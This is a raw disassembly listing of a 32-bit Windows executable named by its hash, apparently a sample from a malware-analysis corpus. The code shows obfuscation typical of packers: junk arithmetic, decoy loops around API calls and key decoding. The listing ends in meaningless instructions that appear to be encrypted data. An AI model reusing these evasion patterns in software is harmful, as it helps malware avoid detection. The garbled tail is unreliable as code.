
fa718fab351e426448ca3a8b880f34770b0f27d916eb622a32c77a83cbbd18cd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	int3   
  40190d:	aaa    
  40190e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190f:	lea    esp,[edx+0x62]
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	jge    0x4018cd
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xc0dcb1f1
  4019bd:	dec    edi
  4019be:	dec    ebx
  4019bf:	pop    ebx
  4019c0:	cmp    BYTE PTR [ecx+0x244d2a6e],ah
  4019c6:	adc    bh,dh
  4019c8:	mov    bh,ch
  4019ca:	jg     0x4019dd
  4019cc:	std    
  4019cd:	test   al,0x75
  4019cf:	cs aaa 
  4019d1:	inc    ecx
  4019d2:	sti    
  4019d3:	sbb    al,0x30
  4019d5:	sub    eax,0xe5f9b024
  4019da:	fidivr DWORD PTR [edi-0x30]
  4019dd:	neg    DWORD PTR ds:0x702ef1a1
  4019e3:	and    ecx,DWORD PTR [ecx]
  4019e5:	sbb    bh,bl
  4019e7:	mov    ch,0x27
  4019e9:	dec    edi
  4019ea:	(bad)  
  4019eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019ec:	push   esp
  4019ed:	sti    
  4019ee:	jbe    0x401a14
  4019f0:	aad    0xa1
  4019f2:	pop    ecx
  4019f3:	dec    ecx
  4019f4:	hlt    
  4019f5:	shl    DWORD PTR [ebp+0x328ed554],0xb4
  4019fc:	push   edx
  4019fd:	ss push eax
  4019ff:	or     ecx,DWORD PTR [edx+0x5a]
  401a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a03:	mov    ebx,0x37eb44bc
  401a08:	call   0xea937d05
  401a0d:	bound  ecx,QWORD PTR [eax]
  401a0f:	or     eax,0x368e1943
  401a14:	aaa    
  401a15:	or     al,BYTE PTR [ecx+eax*1-0x151ea6b2]
  401a1c:	sbb    eax,0xe4ba2978
  401a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a22:	sub    al,0x25
  401a24:	cmp    dl,al
  401a26:	lea    esp,[ebx-0x4d]
  401a29:	lock sahf 
  401a2b:	cwde   
  401a2c:	popfw  
  401a2e:	add    DWORD PTR [edi-0x772549bd],ebx
  401a34:	cmp    ah,ah
  401a36:	jne    0x401a79
  401a38:	jns    0x401a3f
  401a3a:	xchg   edi,eax
  401a3b:	fs xchg ebp,eax
  401a3d:	cmp    al,0xd6
  401a40:	fcmovbe st,st(7)
  401a42:	xor    BYTE PTR [edi-0x3c],bh
  401a45:	cmp    al,0xb9
  401a47:	aas    
  401a48:	outs   dx,BYTE PTR ds:[esi]
  401a49:	cmp    ch,bl
  401a4b:	xor    ebp,ebx
  401a4d:	jp     0x401ab5
  401a4f:	add    al,0xf
  401a51:	or     BYTE PTR [ebp+0x3d],ch
  401a54:	pusha  
  401a55:	inc    DWORD PTR [ecx]
  401a57:	imul   edx,DWORD PTR [esi+esi*8+0x19],0xc90a4589
  401a5f:	dec    esi
  401a60:	push   edx
  401a61:	retf   
  401a62:	inc    ecx
  401a63:	jl     0x401a00
  401a65:	sub    eax,DWORD PTR [ecx-0x7f]
  401a68:	push   0xe7ade6d0
  401a6d:	jo     0x401ac0
  401a6f:	into   
  401a70:	adc    DWORD PTR [eax],ecx
  401a72:	ins    BYTE PTR es:[edi],dx
  401a73:	mul    DWORD PTR [esi]
  401a75:	add    eax,0x83a4be6e
  401a7a:	lods   eax,DWORD PTR ds:[esi]
  401a7b:	pusha  
  401a7c:	pushf  
  401a7d:	add    DWORD PTR [esi-0x72],ecx
  401a80:	lock jne 0x401ab8
  401a83:	mov    ecx,0x60641cf0
  401a88:	out    0x5,eax
  401a8a:	int3   
  401a8b:	shr    DWORD PTR [ebp-0x67],1
  401a8e:	lods   eax,DWORD PTR ds:[esi]
  401a8f:	cdq    
  401a90:	jo     0x401aac
